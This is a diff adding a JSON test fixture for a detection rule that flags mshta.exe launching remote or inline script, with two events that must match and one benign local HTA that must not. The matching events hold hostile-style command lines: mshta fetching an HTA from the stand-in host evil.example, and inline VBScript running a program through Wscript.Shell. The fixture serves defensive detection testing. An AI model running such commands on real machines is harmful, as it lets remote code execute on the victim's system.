@@ -1,0 +1,131 @@
+{
+  "rule_id": "proc-mshta-remote-or-inline-script",
+  "rule_version": "1.0.0",
+  "must_match": [
+    {
+      "name": "mshta remote hta",
+      "event": {
+        "event_id": "00000000-0000-4000-8000-000000000019",
+        "tenant_id": "8c9d0e1f-2a3b-4c5d-6e7f-8a9b0c1d2e3f",
+        "schema_version": "1.0.0",
+        "event_class": "process_activity",
+        "activity": "process_launched",
+        "event_time": "2026-07-08T09:14:03.221Z",
+        "ingest_time": "2026-07-08T09:14:05.100Z",
+        "source_type": "agent",
+        "source_event_id": "fixture-000019",
+        "batch_id": "0b7e3c1a-9d2f-4a5b-8c6d-1e2f3a4b5c6d",
+        "source": {
+          "device_id": "dev_FIXTURE01",
+          "agent_version": "0.3.1"
+        },
+        "host": {
+          "hostname": "acme-ws-01",
+          "os_family": "windows",
+          "os_name": "Windows 11 Pro",
+          "os_version": "10.0.26100",
+          "ip": "10.1.4.23"
+        },
+        "process": {
+          "pid": 4312,
+          "name": "mshta.exe",
+          "exe_path": "C:\\Windows\\System32\\mshta.exe",
+          "cmd_line": "mshta.exe https://evil.example/launch.hta"
+        },
+        "parent": {
+          "pid": 1180,
+          "name": "explorer.exe"
+        },
+        "user": {
+          "name": "sam.jones",
+          "domain": "ACME",
+          "uid": "S-1-5-21-1-2-3-1104"
+        }
+      }
+    },
+    {
+      "name": "mshta inline vbscript",
+      "event": {
+        "event_id": "00000000-0000-4000-8000-000000000020",
+        "tenant_id": "8c9d0e1f-2a3b-4c5d-6e7f-8a9b0c1d2e3f",
+        "schema_version": "1.0.0",
+        "event_class": "process_activity",
+        "activity": "process_launched",
+        "event_time": "2026-07-08T09:14:03.221Z",
+        "ingest_time": "2026-07-08T09:14:05.100Z",
+        "source_type": "agent",
+        "source_event_id": "fixture-000020",
+        "batch_id": "0b7e3c1a-9d2f-4a5b-8c6d-1e2f3a4b5c6d",
+        "source": {
+          "device_id": "dev_FIXTURE01",
+          "agent_version": "0.3.1"
+        },
+        "host": {
+          "hostname": "acme-ws-01",
+          "os_family": "windows",
+          "os_name": "Windows 11 Pro",
+          "os_version": "10.0.26100",
+          "ip": "10.1.4.23"
+        },
+        "process": {
+          "pid": 4312,
+          "name": "mshta.exe",
+          "exe_path": "C:\\Windows\\System32\\mshta.exe",
+          "cmd_line": "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"calc\"\"\")"
+        },
+        "parent": {
+          "pid": 1180,
+          "name": "explorer.exe"
+        },
+        "user": {
+          "name": "sam.jones",
+          "domain": "ACME",
+          "uid": "S-1-5-21-1-2-3-1104"
+        }
+      }
+    }
+  ],
+  "must_not_match": [
+    {
+      "name": "mshta local legacy business app",
+      "event": {
+        "event_id": "00000000-0000-4000-8000-000000000021",
+        "tenant_id": "8c9d0e1f-2a3b-4c5d-6e7f-8a9b0c1d2e3f",
+        "schema_version": "1.0.0",
+        "event_class": "process_activity",
+        "activity": "process_launched",
+        "event_time": "2026-07-08T09:14:03.221Z",
+        "ingest_time": "2026-07-08T09:14:05.100Z",
+        "source_type": "agent",
+        "source_event_id": "fixture-000021",
+        "batch_id": "0b7e3c1a-9d2f-4a5b-8c6d-1e2f3a4b5c6d",
+        "source": {
+          "device_id": "dev_FIXTURE01",
+          "agent_version": "0.3.1"
+        },
+        "host": {
+          "hostname": "acme-ws-01",
+          "os_family": "windows",
+          "os_name": "Windows 11 Pro",
+          "os_version": "10.0.26100",
+          "ip": "10.1.4.23"
+        },
+        "process": {
+          "pid": 4312,
+          "name": "mshta.exe",
+          "exe_path": "C:\\Windows\\System32\\mshta.exe",
+          "cmd_line": "mshta.exe \"C:\\Program Files\\LegacyApp\\menu.hta\""
+        },
+        "parent": {
+          "pid": 1180,
+          "name": "explorer.exe"
+        },
+        "user": {
+          "name": "sam.jones",
+          "domain": "ACME",
+          "uid": "S-1-5-21-1-2-3-1104"
+        }
+      }
+    }
+  ]
+}
